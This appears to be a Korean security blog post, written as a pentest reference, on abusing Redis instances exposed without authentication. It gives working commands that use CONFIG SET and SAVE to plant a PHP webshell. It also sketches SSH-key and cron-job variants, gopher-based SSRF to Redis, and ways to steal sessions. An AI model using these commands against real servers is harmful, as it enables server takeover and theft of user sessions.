---
title: "Redis 노출과 오용"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, NoSQL Injection]
tags: [redis, exposure, rce, web]
description: "인증 없이 노출된 Redis의 명령 직접 실행과, 영속화 설정 변경으로 파일 쓰기(웹셸·키 주입)로 번지는 오용의 개념과 확인 구문을 정리합니다."
mermaid: true
---

> Redis는 기본적으로 인증이 약하고 명령이 강력하다. 네트워크에 노출되거나 애플리케이션이 명령을 제어 가능하게 두면, 데이터 열람을 넘어 **영속화 설정을 바꿔 임의 파일 쓰기**까지 이어진다.

## 개념

인증 없이 접근 가능한 Redis는 모든 키를 읽고 쓸 수 있다. 더 위험한 것은 `CONFIG SET`으로 저장 경로·파일명을 바꾼 뒤 `SAVE`로 **임의 경로에 파일을 생성**할 수 있다는 점이다 — 웹 루트에 웹셸, `authorized_keys`에 SSH 키, cron 디렉터리에 작업을 쓴다. SSRF로 내부 Redis에 명령을 보내는 경로도 흔하다.

```
# 세션/캐시 키가 평문이면 그대로 열람·변조
# CONFIG SET dir + dbfilename + SAVE = 임의 파일 쓰기
```

## 공격·우회 구문

허가된 범위·테스트 인스턴스에서만.

### 노출·정보 확인

```
redis-cli -h <host> ping / info / CONFIG GET *
KEYS *  →  세션·토큰·캐시 열람 (운영에서는 SCAN)
세션 키 변조로 다른 사용자 세션 탈취
```

### 임의 파일 쓰기 (영속화 악용)

```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['c']);?>"
SAVE                         # → /var/www/html/shell.php 생성
# 변형: dir ~/.ssh + dbfilename authorized_keys + SSH 공개키
# 변형: dir /var/spool/cron + cron 작업
```

### SSRF 경유 (Gopher/inline 명령)

```
내부 Redis(6379)에 SSRF 로 접근:
  gopher://127.0.0.1:6379/_<CRLF로 구분된 Redis 명령>
HTTP 기반 SSRF 라도 inline 명령이 Redis에 해석되는 경우
```

### 확인 요령

```
AUTH 없이 명령이 먹는지, protected-mode·bind 설정, requirepass 유무
CONFIG/SAVE/SLAVEOF/MODULE 같은 위험 명령이 rename 되어 있는지
앱이 Redis 키/명령을 사용자 입력으로 구성하는지(명령 주입)
```

## 참고 자료

- [Redis Security](https://redis.io/docs/latest/operate/oss_and_stack/management/security/)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
